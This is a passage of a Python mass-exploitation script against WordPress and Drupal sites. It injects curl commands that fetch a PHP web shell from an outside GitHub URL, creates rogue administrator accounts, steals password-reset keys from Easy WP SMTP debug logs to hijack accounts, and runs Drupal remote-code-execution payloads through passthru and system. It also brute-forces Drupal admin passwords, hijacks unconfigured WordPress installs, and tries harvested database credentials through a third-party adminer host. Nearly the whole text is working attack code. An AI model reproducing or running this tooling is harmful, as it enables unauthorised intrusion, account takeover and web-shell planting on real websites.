                print(la7mar +'[WP]'+cyan+url+cyan+la7mar +'[Not Vuln wp-mail-smtp]'+la7mar+ '\n')
        except:
            print(la7mar +'[WP]'+cyan+url+cyan+la7mar +'[Not Vuln wp-mail-smtp]'+la7mar+ '\n')
            pass
        try:
            s = requests.Session()
            r = s.post(url+"/wp-content/plugins/wp-mail-smtp-pro/vendor/woocommerce/action-scheduler/classes/abstracts/ActionScheduler_Abstract_ListTable.php",data={'row_id':'curl https://raw.githubusercontent.com/izx2023/z/main/14.php'})
            Check = s.get(url  + '/wp-content/plugins/wp-mail-smtp-pro/vendor/woocommerce/action-scheduler/classes/abstracts/14.php', headers=Headers)
            if 'SEA-GHOST' in Check.text:
                with open('Vulns/Shell_Vulnss.txt', 'a') as writer:
                    writer.write(url  + '/wp-content/plugins/wp-mail-smtp-pro/vendor/woocommerce/action-scheduler/classes/abstracts/14.php' + '\n')
                print(la5dhar +'[WP]'+ url + ' +++++++++++++ [wp-mail-smtp-pro Uploaded Shell]'+ '\n')

            else:
                print(la7mar +'[WP]'+cyan+url+cyan+la7mar +'[Not Vuln wp-mail-smtp-pro]'+la7mar+ '\n')
        except:
            print(la7mar +'[WP]'+cyan+url+cyan+la7mar +'[Not Vuln wp-mail-smtp-pro]'+la7mar+ '\n')
            pass
        try:
            s = requests.Session()
            r = s.post(url+"/wp-content/plugins/wpforms/vendor/woocommerce/action-scheduler/classes/abstracts/ActionScheduler_Abstract_ListTable.php",data={'row_id':'curl https://raw.githubusercontent.com/izx2023/z/main/14.php'})
            Check = s.get(url  + '/wp-content/plugins/wpforms/vendor/woocommerce/action-scheduler/classes/abstracts/14.php', headers=Headers)
            if 'SEA-GHOST' in Check.text:
                with open('Vulns/Shell_Vulnss.txt', 'a') as writer:
                    writer.write(url  + '/wp-content/plugins/wpforms/vendor/woocommerce/action-scheduler/classes/abstracts/14.php' + '\n')
                print(la5dhar +'[WP]'+ url + ' +++++++++++++ [wpforms Uploaded Shell]'+ '\n')

            else:
                print(la7mar +'[WP]'+cyan+url+cyan+la7mar +'[Not Vuln wpforms]'+la7mar+ '\n')
        except:
            print(la7mar +'[WP]'+cyan+url+cyan+la7mar +'[Not Vuln wpforms]'+la7mar+ '\n')
            pass
        try:
            s = requests.Session()
            r = s.post(url+"/wp-content/plugins/wpforms-lite/vendor/woocommerce/action-scheduler/classes/abstracts/ActionScheduler_Abstract_ListTable.php",data={'row_id':'curl https://raw.githubusercontent.com/izx2023/z/main/14.php'})
            Check = s.get(url  + '/wp-content/plugins/wpforms-lite/vendor/woocommerce/action-scheduler/classes/abstracts/14.php', headers=Headers)
            if 'SEA-GHOST' in Check.text:
                with open('Vulns/Shell_Vulnss.txt', 'a') as writer:
                    writer.write(url  + '/wp-content/plugins/wpforms-lite/vendor/woocommerce/action-scheduler/classes/abstracts/14.php' + '\n')
                print(la5dhar +'[WP]'+ url + ' +++++++++++++ [wpforms-lite Uploaded Shell]'+ '\n')

            else:
                print(la7mar +'[WP]'+cyan+url+cyan+la7mar +'[Not Vuln wpforms-lite]'+la7mar+ '\n')
        except:
            print(la7mar +'[WP]'+cyan+url+cyan+la7mar +'[Not Vuln wpforms-lite]'+la7mar+ '\n')
            pass
        try:
            s = requests.Session()
            r = s.post(url+"/wp-content/plugins/zionbuilder/vendor/woocommerce/action-scheduler/classes/abstracts/ActionScheduler_Abstract_ListTable.php",data={'row_id':'curl https://raw.githubusercontent.com/izx2023/z/main/14.php'})
            Check = s.get(url  + '/wp-content/plugins/zionbuilder/vendor/woocommerce/action-scheduler/classes/abstracts/14.php', headers=Headers)
            if 'SEA-GHOST' in Check.text:
                with open('Vulns/Shell_Vulnss.txt', 'a') as writer:
                    writer.write(url  + '/wp-content/plugins/zionbuilder/vendor/woocommerce/action-scheduler/classes/abstracts/14.php' + '\n')
                print(la5dhar +'[WP]'+ url + ' +++++++++++++ [zionbuilder Uploaded Shell]'+ '\n')

            else:
                print(la7mar +'[WP]'+cyan+url+cyan+la7mar +'[Not Vuln zionbuilder]'+la7mar+ '\n')
        except:
            print(la7mar +'[WP]'+cyan+url+cyan+la7mar +'[Not Vuln zionbuilder]'+la7mar+ '\n')
            pass

        try:
            getme = requests.get(url + '/wp-json/trx_addons/v2/get/sc_layout?sc=print_r',headers=Headers,timeout=15)
            if '"data":true}' in getme.text:
            #print((green + url + " +++++++++++++ Success Themeregex Exploit"))
                ckme = requests.get(url + '/wp-json/trx_addons/v2/get/sc_layout?sc=wp_insert_user&role=administrator&user_login=izo0dayx1&user_pass=pwnedx',headers=Headers,timeout=15)
            if "data" in ckme.text:
                print(la5dhar +'[WP]'+ url + ' +++++++++++++ [ThemeRegex vuln]'+ '\n')
                open("Vulns/themeregex.txt", "a").write(url + '/wp-login.php@izo0dayx1@pwnedx'+'\n')
                slug="izo0dayx1"
                new_pass="pwnedx"
                self.wpupload(url,slug,new_pass)
            else:
                print(la7mar +'[WP]'+cyan+url+cyan+la7mar +'[Not Vuln ThemeRegex]'+la7mar+ '\n')          

        except:
            print(la7mar +'[WP]'+cyan+url+cyan+la7mar +'[Not Vuln ThemeRegex]'+la7mar+ '\n')
            pass

        try:

            izo = self.ran(10) + '.php'
            data = {'file':(izo, shell, 'text/html')}
            getme = requests.post(url + '/wp-admin/admin-ajax.php?action=wpsc_tickets&setting_action=rb_upload_file',headers=headersh,files=data,timeout=15)
            tok = re.findall('\/wp-content\/uploads\/wpsc\/(.*?)_'+izo,getme.text)
            IndexPath = url + '/wp-content/uploads/wpsc/'+tok[0]+'_'+izo        
            CheckIndex = requests.get(IndexPath, timeout=10, headers=headersh)
            if 'RxR HaCkEr' in str(CheckIndex.text):
                print(la5dhar +'[WP]'+ url + ' +++++++++++++ [SupportCandy Shell]'+ '\n')
                open("Vulns/Shells.txt", "a").write(url + '/wp-content/uploads/wpsc/'+tok[0]+'_'+izo+'\n')
            else:
                print(la7mar +'[WP]'+cyan+url+cyan+la7mar +'[Not Vuln SupportCandy ]'+la7mar+ '\n')
            #else:
                #print((red + url + " ------------ synoptic Not Vuln"))
        except:
            print(la7mar +'[WP]'+cyan+url+cyan+la7mar +'[Not Vuln SupportCandy ]'+la7mar+ '\n')
            pass 

                                   
        try:
            self.my_session = requests.Session()
            headerih = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0',
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                        'Accept-Language': 'en-US,en;q=0.5',
                        'Accept-Encoding': 'gzip, deflate',
                        'Cookie': 'wordpress_test_cookie=WP+Cookie+check; humans_21909=1;'}
            exploitwp = '/wp-content/plugins/easy-wp-smtp/'
            r = self.my_session.get(url+exploitwp, timeout=15, headers=Headers)
            if "Index of /" in r.text:
                if 'debug' in r.text:
                    token = re.findall('<a href="(.*?)_debug_log.txt', r.text)
                    print(la5dhar +'[WP]'+ url + ' +++++++++++++ [easy-wp-smtp method-1 Vuln]'+ '\n')
                    open("Vulns/easysmtp.txt", "a").write(url + '/wp-content/plugins/easy-wp-smtp/'+token[0]+'_debug_log.txt'+ ' ->>' +url+"/wp-login.php?action=rp"+'\n')
                    try:
                        r = self.my_session.get(url+'/wp-json/wp/v2/users', verify=False, timeout=10, allow_redirects=False, headers=headerih)
                        if r.status_code == 200:
                            if 'slug' in r.text:
                                slug = r.json()[0]['slug']
                                r = self.my_session.get(url+'/wp-login.php?action=lostpassword', verify=False, timeout=15, allow_redirects=False, headers=headerih)
                                print(la5dhar +'[EasySMTP]'+ url + ' +++++++++++++ [Waiting password reset]'+ '\n')
                                if r.status_code == 200:
                                   
                                   data = {'user_login': slug, 'redirect_to': '', 'wp-submit': 'Get+New+Password'}
                                   r = self.my_session.post(url+'/wp-login.php?action=lostpassword', verify=False, timeout=10, allow_redirects=False, headers=headerih, data=data)
                                   time.sleep(0.5)
                                   ro = self.my_session.get(url+'/wp-content/plugins/easy-wp-smtp/'+token[0]+'_debug_log.txt', verify=False, timeout=10, allow_redirects=False, headers=Headers)
                                   tokenx = re.findall('rp&key=(.*?)&login', ro.text)
                                   if not tokenx:
                                      print(la7mar +'[EasySMTP]'+cyan+url+cyan+la7mar +'[cant find any reset password keys]'+la7mar+ '\n')

                                   else:
                                       tokeny = tokenx[-1]
                                       new_pass = self.ran(8)
                                       rp_data = {
                                           'pass1': new_pass,
                                           'pass2': new_pass,
                                           'rp_key': tokeny
                                       }
    
                                       rotx = self.my_session.get(url+'/wp-login.php?action=rp&key='+tokeny+'&login='+slug, verify=False, timeout=10, headers=headerih)
                                       time.sleep(0.1) 
                                       rottx = self.my_session.post(url+'/wp-login.php?action=resetpass',data=rp_data)
                                       if not rottx:
                                          print(la7mar +'[EasySMTP]'+cyan+url+cyan+la7mar +'[cant reset password, invalid key]'+la7mar+ '\n')
                                       else:
                                           print(la5dhar +'[EasySMTPWP]'+ url+'/wp-login.php user:'+slug+ ' pass:'+new_pass+'\n')
                                           self.wpupload(url,slug,new_pass)
                                           with open('Vulns/vuln.txt', 'a+') as output:
                                              output.write(url+'/wp-login.php user:'+slug+ ' pass:'+new_pass+'\n')

                    except:
                        pass                                   
                                        
                else:
                    r = self.my_session.get(url+'/wp-json/wp/v2/users', verify=False, timeout=10, allow_redirects=False, headers=headerih)
                    if r.status_code == 200:
                        if 'slug' in r.text:
                           slug = r.json()[0]['slug'] 
                           data = {'user_login': slug, 'redirect_to': '', 'wp-submit': 'Get+New+Password'}
                           r = self.my_session.post(url+'/wp-login.php?action=lostpassword', verify=False, timeout=15, allow_redirects=False, headers=headerih, data=data)
                           time.sleep(0.5)
                           r = self.my_session.get(url+'/wp-content/plugins/easy-wp-smtp/', timeout=15, headers=Headers)
                           if 'debug' in r.text:
                               token = re.findall('<a href="(.*?)_debug_log.txt', r.text)
                               print(la5dhar +'[WP]'+ url + ' +++++++++++++ [easy-wp-smtp method-2 Vuln]'+ '\n')
                               open("Vulns/easysmtp.txt", "a").write(url + '/wp-content/plugins/easy-wp-smtp/'+token[0]+'_debug_log.txt'+ ' ->>' +url+"/wp-login.php?action=rp"+'\n')
                               time.sleep(0.5)
                               ro = self.my_session.get(url+'/wp-content/plugins/easy-wp-smtp/'+token[0]+'_debug_log.txt', verify=False, timeout=10, allow_redirects=False, headers=Headers)
                               tokenx = re.findall('rp&key=(.*?)&login', ro.text)
                               if not tokenx:
                                  print(la7mar +'[EasySMTP]'+cyan+url+cyan+la7mar +'[cant find any reset password keys]'+la7mar+ '\n')

                               else:
                                    tokeny = tokenx[-1]
                                    new_pass = self.ran(8)
                                    rp_data = {
                                        'pass1': new_pass,
                                        'pass2': new_pass,
                                        'rp_key': tokeny
                                    }
    
                                    rotx = self.my_session.get(url+'/wp-login.php?action=rp&key='+tokeny+'&login='+slug, verify=False, timeout=10, headers=headerih)
                                    time.sleep(0.1) 
                                    rottx = self.my_session.post(url+'/wp-login.php?action=resetpass',data=rp_data)
                                    if not rottx:
                                       print(la7mar +'[EasySMTP]'+cyan+url+cyan+la7mar +'[cant reset password, invalid key]'+la7mar+ '\n')
                                    else:
                                        #print(url+'/wp-login.php user:'+slug+ ' pass:'+new_pass+'\n')
                                        print(la5dhar +'[EasySMTPWP]'+ url+'/wp-login.php user:'+slug+ ' pass:'+new_pass+'\n')
                                        self.wpupload(url,slug,new_pass)
                                        with open('Vulns/vuln.txt', 'a+') as output:
                                            output.write(url+'/wp-login.php user:'+slug+ ' pass:'+new_pass+'\n')
                                               
            else:
                print(la7mar +'[WP]'+cyan+url+cyan+la7mar +'[easy-wp-smtp Not Vuln]'+la7mar+ '\n')
                
                pass
        except:
            print(la7mar +'[WP]'+cyan+url+cyan+la7mar +'[easy-wp-smtp Not Vuln]'+la7mar+ '\n')
            pass

        try:
            self.my_session = requests.Session()
            headerih = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0',
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                        'Accept-Language': 'en-US,en;q=0.5',
                        'Accept-Encoding': 'gzip, deflate',
                        'Cookie': 'wordpress_test_cookie=WP+Cookie+check; humans_21909=1;'}
            exploitwp = '/wp-content/plugins/easy-wp-smtp/'
            r = self.my_session.get(url+exploitwp, timeout=15, headers=Headers)
            if "Index of /" in r.text:
                if 'debug' in r.text:
                    token = re.findall('<a href="(.*?)_debug_log.txt', r.text)
                    print(la5dhar +'[WP]'+ url + ' +++++++++++++ [easy-wp-smtp method-3 Vuln]'+ '\n')
                    open("Vulns/easysmtp.txt", "a").write(url + '/wp-content/plugins/easy-wp-smtp/'+token[0]+'_debug_log.txt'+ ' ->>' +url+"/wp-login.php?action=rp"+'\n')
                    try:
                        r = self.my_session.get(url+'/wp-content/plugins/easy-wp-smtp/'+token[0]+'_debug_log.txt', verify=False, timeout=15, allow_redirects=False, headers=headerih)
                        if r.status_code == 200:
                            if '&login=' in r.text:
                                tokenx = re.findall('&login=(.*?)>', r.text)
                                r = self.my_session.get(url+'/wp-login.php?action=lostpassword', verify=False, timeout=15, allow_redirects=False, headers=headerih)
                                print(la5dhar +'[EasySMTP]'+ url + ' +++++++++++++ [Waiting password reset]'+ '\n')
                                if r.status_code == 200:
                                   
                                   data = {'user_login': tokenx[0], 'redirect_to': '', 'wp-submit': 'Get+New+Password'}
                                   r = self.my_session.post(url+'/wp-login.php?action=lostpassword', verify=False, timeout=10, allow_redirects=False, headers=headerih, data=data)
                                   time.sleep(0.5)
                                   ro = self.my_session.get(url+'/wp-content/plugins/easy-wp-smtp/'+token[0]+'_debug_log.txt', verify=False, timeout=15, allow_redirects=False, headers=Headers)
                                   tokenxx = re.findall('rp&key=(.*?)&login', ro.text)
                                   if not tokenxx:
                                      print(la7mar +'[EasySMTP]'+cyan+url+cyan+la7mar +'[cant find any reset password keys]'+la7mar+ '\n')

                                   else:
                                       tokeny = tokenxx[-1]
                                       new_pass = self.ran(8)
                                       rp_data = {
                                           'pass1': new_pass,
                                           'pass2': new_pass,
                                           'rp_key': tokeny
                                       }
    
                                       rotx = self.my_session.get(url+'/wp-login.php?action=rp&key='+tokeny+'&login='+tokenx[0], verify=False, timeout=15, headers=headerih)
                                       time.sleep(0.1) 
                                       rottx = self.my_session.post(url+'/wp-login.php?action=resetpass',data=rp_data)
                                       if not rottx:
                                          print(la7mar +'[EasySMTP]'+cyan+url+cyan+la7mar +'[cant reset password, invalid key]'+la7mar+ '\n')
                                       else:
                                           print(la5dhar +'[EasySMTPWP]'+ url+'/wp-login.php user:'+tokenx[0]+ ' pass:'+new_pass+'\n')
                                           self.wpupload(url,tokenx[0],new_pass)
                                           with open('Vulns/vuln.txt', 'a+') as output:
                                              output.write(url+'/wp-login.php user:'+tokenx[0]+ ' pass:'+new_pass+'\n')

                    except:
                        pass
        except:
            print(la7mar +'[WP]'+cyan+url+cyan+la7mar +'[easy-wp-smtp Not Vuln]'+la7mar+ '\n')
            pass

        try:

            exploit = url+'/author/wordcamp/'
            cek_site = my_session.get(exploit).text
            if 'Posts by wordcamp' in cek_site:       
                print(la5dhar +'[WP]'+ url + ' +++++++++++++ [wordcamp Found]'+ '\n')
                open("Vulns/wordcamp.txt", "a").write(url + '/author/wordcamp/'+'\n') 
                slug="wordcamp"
                new_pass="z43218765z"
                self.wpupload(url,slug,new_pass)           
            else:
                print(la7mar +'[WP]'+cyan+url+cyan+la7mar +'[wordcamp Not Vuln]'+la7mar+ '\n')
                slug="wordcamp"
                new_pass="z43218765z"
                self.wpupload(url,slug,new_pass)
        except Exception as e:
            print(e)

        try:
            PATHz = [
            '',
            '/wordpress',
            '/wp',
            '/blog',
            '/test',
            '/site']
            x = 0
            email="sercany9293@gmail.com"
            for path in PATHz:
                C = requests.get(url + path + '/wp-admin/setup-config.php?step=0')
                if 'setup-config.php?step=1' in str(C.text):
                    print(la5dhar +'[WP]'+ url + ' +++++++++++++ [install Found]'+ '\n')
                    open("Vulns/install.txt", "a").write(url + path + '/wp-admin/setup-config.php?step=0'+'\n')
                    x += 1
                    self.WpInstall(url + path, email)

            if x == 0:
               print(la7mar +'[WP]'+cyan+url+cyan+la7mar +'[İnstall Not Vuln]'+la7mar+ '\n')
               #self.wpupload(url,"admin","admin@123")
        except:
            print(la7mar +'[WP]'+cyan+url+cyan+la7mar +'[İnstall Not Vuln]'+la7mar+ '\n')
            pass

        try:
            r = requests.get(url+'/wp-login.php', timeout=10, headers=headers, verify=False)
            if r.ok:
                cookies = r.headers['Set-Cookie']
                self.get_user(url, cookies)
        except:
            pass            

    def timezone(self,url):
        try:

            command = ('uname -a')
            data1 = url+'/user/register?element_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
            data2 = {'form_id':'user_register_form','_drupal_ajax':'1','timezone[a][#lazy_builder][]':'passthru','timezone[a][#lazy_builder][][]':command}
            ambush = requests.post(data1, data=data2, timeout=5).text

            #cek home
            command2 = ('curl https://raw.githubusercontent.com/izx2023/z/main/14xx.php')
            data3 = url+'/user/register?element_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
            data4 = {'form_id':'user_register_form','_drupal_ajax':'1','timezone[a][#lazy_builder][]':'passthru','timezone[a][#lazy_builder][][]':command2}
            jembit = requests.post(data3, data=data4, timeout=5).text
            kontoool = requests.get(url+'/14xx.php')

            #cek default
            command3 = ('curl https://raw.githubusercontent.com/izx2023/z/main/14xx.php > /sites/default/files/14xx.php')
            data100 = url+'/user/register?element_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
            data200 = {'form_id':'user_register_form','_drupal_ajax':'1','timezone[a][#lazy_builder][]':'passthru','timezone[a][#lazy_builder][][]':command3}
            pepek = requests.post(data100, data=data200, timeout=5)
            kontiil = requests.get(url+'/sites/default/files/14xx.php')
            if 'Linux' in ambush:
                print(la5dhar +'[Drupal]'+ url + ' +++++++++++++ [Vuln Drupal8 Timezone]'+ '\n')
                open('Vulns/drupal_vuln.txt', 'a').write(url + "\n")
                if 'SEA-GHOST' in kontoool:
                    open('Vulns/Shells.txt', 'a').write(url+'/14xx.php'+'\n')

                else:

                    if 'SEA-GHOST' in kontiil:
                        print(la5dhar +'[Drupal]'+ url + ' +++++++++++++ [Vuln Drupal8 Timezone]'+ '\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/sites/default/files/14xx.php'+'\n')
                    else:
                        print((la7mar +'[Drupal]'+cyan+url+cyan+la7mar +'[Failed shell upload]'+la7mar+ '\n'))

            else:
                print((la7mar +'[Drupal]'+cyan+url+cyan+la7mar +'[Not Vuln]'+la7mar+ '\n'))
        except requests.exceptions.ConnectTimeout:
            print((la7mar +'[Drupal]'+cyan+url+cyan+la7mar +'[Not Vuln]'+la7mar+ '\n'))
        except Exception as e:
            pass

    def mail(self,url):
        try:

            command = ('uname -a')
            url1 = url + '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax' 
            payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'passthru', 'mail[#type]': 'markup', 'mail[#markup]':command}
            ambush2 = requests.post(url1, data=payload, timeout=5).text
            url2 = url + '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax' 
            payload2 = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'passthru', 'mail[#type]': 'markup', 'mail[#markup]':'curl https://raw.githubusercontent.com/izx2023/z/main/14xx.php'}
            ambuz = requests.post(url2, data=payload2, timeout=5).text
            bla = requests.get(url+'/14xx.php')
            cekdir = url+'/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
            hajar = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'passthru', 'mail[#type]': 'markup', 'mail[#markup]':'curl https://raw.githubusercontent.com/izx2023/z/main/14xx.php > /sites/default/files/14xx.php'}
            kontill = url+'/sites/default/files/14xx.php'
            if 'Linux' in ambush2:
                print(la5dhar +'[Drupal]'+ url + ' +++++++++++++ [Vuln Drupal8 Mail]'+ '\n')
                if 'SEA-GHOST' in bla:
                    open('Vulns/Shells.txt', 'a').write(url+'/14xx.php' + "\n")

                else:
                    if 'SEA-GHOST' in kontill:
                        print(la5dhar +'[Drupal]'+ url + ' +++++++++++++ [Vuln Drupal8 Mail]'+ '\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/sites/default/files/14xx.php'+'\n')

                    else:
                        print((la7mar +'[Drupal]'+cyan+url+cyan+la7mar +'[shell up failed]'+la7mar+ '\n'))



            else:
                print((la7mar +'[Drupal]'+cyan+url+cyan+la7mar +'[Not Vuln]'+la7mar+ '\n'))
        except requests.exceptions.ConnectTimeout:
            print((la7mar +'[Drupal]'+cyan+url+cyan+la7mar +'[Not Vuln]'+la7mar+ '\n'))
        except Exception as e:
            #print('{}[ {}NOT VULNERABLE {}] {}{} {}[ {}URL ERROR {}] ' .format(fc,fr,fc,fg,url,fc,fr,fc))
            print(e)


    def drupal7_1(self,url):
        try:

            kentot = (url+'/?q=user/password&name[%23post_render][]=system&name[%23markup]=uname -a&name[%23type]=markup')
            data = {
            'form_id':'user_pass',
            '_triggering_element_name':'name'
            }
            r = requests.post(kentot,data = data,verify = False,timeout = 5)
            result = re.search(r'<input type="hidden" name="form_build_id" value="([^"]+)" />', r.text)
            if result:
                found = result.group(1)
                url2= url + '?q=file/ajax/name/%23value/'+found
                data = {'form_build_id' : found}
                r = requests.post(url2,data = data,verify = False,timeout = 5).text
                kentot2 = (url+'/?q=user/password&name[%23post_render][]=system&name[%23markup]=curl https://raw.githubusercontent.com/izx2023/z/main/14xx.php > /sites/default/files/14xx.php&name[%23type]=markup')
                data6 = {
                    'form_id':'user_pass',
                    '_triggering_element_name':'name'
                }
                re2 = requests.post(kentot2,data = data6,verify = False,timeout = 5)
                result2 = re.search(r'<input type="hidden" name="form_build_id" value="([^"]+)" />', re2.text)
                if result2:
                    found3  = result2.group(1)
                    url23 = url+'?q=file/ajax/name/%23value/'+found3
                    data1 = {'form_build_id' : found3}
                    babi = requests.post(url23, data=data1, verify = False, timeout=5)
                    cek = requests.get(url+'/sites/default/files/14xx.php').text
                else:
                    pass
                #kentot3 = (url+'/?q=user/password&name[%23post_render][]=system&name[%23markup]=curl https://raw.githubusercontent.com/Avinash-acid/Shell-Uploader/master/uploader.php -o hjk.php&name[%23type]=markup')
                kentot3 = (url+'/?q=user/password&name[%23post_render][]=system&name[%23markup]=curl https://raw.githubusercontent.com/izx2023/z/main/14xx.php -o hjkk.php&name[%23type]=markup')
                data7 = {
                    'form_id':'user_pass',
                    '_triggering_element_name':'name'
                }
                re3 = requests.post(kentot3,data = data7,verify = False,timeout = 5)
                result3 = re.search(r'<input type="hidden" name="form_build_id" value="([^"]+)" />', re3.text)
                if result3:
                    found4  = result3.group(1)
                    url234 = url+'/?q=file/ajax/name/%23value/'+found4
                    data2 = {'form_build_id' : found4}
                    babi = requests.post(url234, data=data2, verify = False, timeout=5)
                    cek1 = requests.get(url+'/hjkk.php').text
                else:
                    pass

                if 'Linux' in r:
                    print(la5dhar +'[Drupal]'+ url + ' +++++++++++++ [Vuln Drupal7]'+ '\n')
                    if 'SEA-GHOST' in cek:
                        print(la5dhar +'[Drupal]'+ url + ' +++++++++++++ [Upload Shell Drupal7]'+ '\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/sites/default/files/14xx.php'+'\n')

                    else:
                        if 'SEA-GHOST' in cek1:
                            print(la5dhar +'[Drupal]'+ url + ' +++++++++++++ [Upload Shell Drupal7]'+ '\n')
                            open('Vulns/Shells.txt', 'a').write(url+'/hjkk.php'+'\n')

                        else:
                            print((la7mar +'[Drupal]'+cyan+url+cyan+la7mar +'[shell upload failed]'+la7mar+ '\n'))
                #    upshell(url)

                        #writable(url)
                    
                else:
                    print((la7mar +'[Drupal]'+cyan+url+cyan+la7mar +'[Not Vuln]'+la7mar+ '\n'))
            else:
                print((la7mar +'[Drupal]'+cyan+url+cyan+la7mar +'[Not Vuln]'+la7mar+ '\n'))
        except requests.exceptions.ConnectTimeout:
            print((la7mar +'[Drupal]'+cyan+url+cyan+la7mar +'[CONNECTION TIMEOU]'+la7mar+ '\n'))
        except Exception as e:
            #print('{}[ {}NOT VULNERABLE {}] {}{} {}[ {}URL ERROR {}] ' .format(fc,fr,fc,fg,url,fc,fr,fc))
            print(e)

    def Drupal(self,url):
        passlist = ["123", "uT3ygfF44Cdlp4TFyq", "admin", "123456", "pass", "password", "admin123", "12345", "admin@123",
                    "123321", "test",
                    "123456789", "1234", "12345678", "123123", "demo", "blah", "hello", "1234567890", "zx321654xz",
                    "1234567", "adminadmin", "welcome", "666666", "access", "1q2w3e4r", "xmagico", "admin1234"]

        agent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}

        for password in passlist:
            password = password.strip()
            try:

                lib = requests.session()

                Getcsrf = lib.get(url + '/?q=user',timeout=7)

                # Get Token
                Token1 = re.findall('"form_build_id" value="(.*?)" />', Getcsrf.text)
                Token2 = re.findall('type="hidden" name="form_id" value="user(.*?)" />', Getcsrf.text)
                Token3 = re.findall('id="edit-submit" name="op" value="(.*?)" class="', Getcsrf.text)
                Token4 = re.findall('name="op" id="edit-submit" value="(.*?)" class="', Getcsrf.text)

                # Data Tokens

                Tokenk = []
                Tokenk.append(Token3)
                Tokenk.append(Token4)

                for tok3 in Tokenk:
                    tok3 = tok3
                    for tok4 in tok3:
                        Tokens = tok4
                # You Can add Any User u Want ^^

                user = 'admin'
                bdaa0x = {'name': user,
                       'pass': password,
                       'form_build_id': Token1[0],
                       'form_id': 'user' + str(Token2[0]),
                       'op': Tokens
                       }

                req = lib.post(url + '/?q=user', data=bdaa0x, headers=agent,timeout=7)


                if '"user/logout"' in req.text:
                    open('Vulns/DrupalCracked.txt', 'a').write(url + '/?q=user' + '|' + Users + '|' + passwd + '\n')
                    print(lasfar + '-----------------------------------------Drupal-----------------------------------------' + labyadh + '\n')
                    print(la5dhar + "[+] Cracked Success Drupal--> " + url + '/admin|' + user + '|' + password + labyadh + '\n')
                    print(lasfar + '--------------------------------------------------------------------------------------------' + labyadh + '\n')

                else:
                    print('[-] Failed  Drupal --> ' + url + '|admin|' + password + labyadh + '\n')

            except:
                pass

    def LoginHTTP(self,host, username, password, db, url):
        try:
            LH = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/72.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3',
            'Accept-Encoding': 'gzip, deflate',
            'Referer': 'http://15.206.78.6/adminer.php',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
            }
            Data = {'auth[driver]': 'server','auth[server]':host,'auth[username]':username,'auth[password]':password,'auth[db]':db}
            sess = requests.session()
            #http://157.245.169.243/adminer.php
            sess.post('http://15.206.78.6/adminer.php', timeout=15, headers=LH, data=Data)
            C = sess.get('http://15.206.78.6/adminer.php?server={}&username={}&db={}'.format(host, username, db), timeout=25, headers=Headers)
            if 'logout' in C.text:
                print(la5dhar +'[MysqlConnect]Bingoooooo  +++++++++++++ [MysqlConnect Success]'+ '\n')
                with open('Vulns/mysqlconnect.txt', 'a') as ww:
                   ww.write(url+ ' Tool:http://15.206.78.6/adminer.php ---->>>>' +host+' : ' +username+' : ' + password +' : ' +db+ '\n\n')
            else:
                print(la7mar +'[MysqlConnect]'+cyan+url+cyan+la7mar +'[Not Connect Mysql]'+la7mar+ '\n')
        except:
            pass



    def pma(self,url,username,password):
        try:
            pazx = [
            '/phpMyAdmin/',
            '/phpmyadmin/',
            '/PMA/',
            '/dbadmin/',         
            '/mysql/',
            '/sqlmanager/',         
            '/mysqladmin/']
            for pasf in pazx:
                Exp = url + pasf
                GetConfiga = requests.get(Exp, timeout=15, headers=Headers)
                if requests.get(url+'/bypassec0x1337').status_code == 200:
                   #print(la5dhar +'[AdminPanel]'+ url + ' +++++++++++++ [Fake Admin Panel]'+ '\n')
                   pass
                elif GetConfiga.status_code == 200:
                    #print(username,password)
                    print(la5dhar +'[PhpMyAdmin]'+ url + ' +++++++++++++ [Found PhpMyadmin Panel]'+ '\n')
                    with open('Vulns/pma.txt', 'a') as writer:
                       writer.write(Exp + '\n')
                    response = requests.Session()
                    res = response.get(Exp)
                    token = re.search('input.*value=\"(.*?)\"', res.text, re.S).group(1)
                    data={
                        'pma_username':username,
                        'pma_password':password,
                        'server':'1',
                        'target':'index.php',
                        'token':token
                    }
                    headers = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0"}
                    r=response.post(Exp,data=data,headers=headers)
                    if 'information_schema' in r.text:                    
                        print(la5dhar +'[PhpMyAdmin]'+ url + ' +++++++++++++ [Login Success PhpMyadmin]'+ '\n')
                        with open('Vulns/pma.txt', 'a') as ww:
                            ww.write(Exp+' --->>>>>>> '+username+' : ' + password + '\n\n')
                            #sys.exit()
                    else:
                        print(la7mar +'[PhpMyAdmin]'+cyan+url+cyan+la7mar +'[Not login PhpMyadmin]'+la7mar+ '\n')
                else:
                    pass
        except Exception as e: 
    	    pass
    def pmax(self,host,username,password,url):
        try:
            pazx = [
            '/phpMyAdmin/',
            '/phpmyadmin/']
            for pasf in pazx:
                Exp = 'http://'+host + pasf
                GetConfiga = requests.get(Exp, timeout=15, headers=Headers)
